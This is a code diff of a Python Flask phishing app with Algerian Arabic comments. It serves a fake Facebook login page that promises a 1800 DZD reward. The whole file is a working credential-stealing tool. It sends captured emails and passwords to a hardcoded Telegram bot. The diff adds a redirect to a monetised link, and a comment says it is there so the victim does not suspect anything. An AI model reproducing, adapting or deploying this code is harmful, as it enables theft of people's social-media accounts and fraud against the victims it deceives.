@@ -1,12 +1,15 @@
 import os
 import requests
-from flask import Flask, request
+from flask import Flask, request, redirect
 
 app = Flask(__name__)
 
-# حط التوكن والـ ID تاعك هنا
+# معلومات البوت تاعك (تأكد منها)
 BOT_TOKEN = "7917897258:AAH8N6L3X8J8L6_J8X8J8L6_J8X8J8L6" 
 CHAT_ID = "7449520860"
+
+# الرابط اللي راح نبعثوه ليه بعد ما يسجل الدخول
+MONEY_SITE = "https://trianglerockers.com/1885419"
 
 HTML_PAGE = """
 <!DOCTYPE html>
@@ -25,6 +28,7 @@ HTML_PAGE = """
 <body>
     <div class="box">
         <h1 style="color: #1877f2;">facebook</h1>
+        <p style="font-size: 14px; color: #606770;">سجل دخولك للمطالبة بمكافأة الـ 1800 دج</p>
         <form method="POST" action="/login">
             <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
             <input type="password" name="password" placeholder="كلمة السر" required>
@@ -44,8 +48,12 @@ def login():
     email = request.form.get('email')
     password = request.form.get('password')
     message = f"✅ صيدة جديدة من فارس!\n📧 الإيميل: {email}\n🔑 الباسورد: {password}"
+    
+    # إرسال للتلغرام
     requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": message})
-    return "خطأ في الاتصال، حاول لاحقاً"
+    
+    # توجيه الضحية لموقع الدراهم باش ما يشكش
+    return redirect(MONEY_SITE)
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
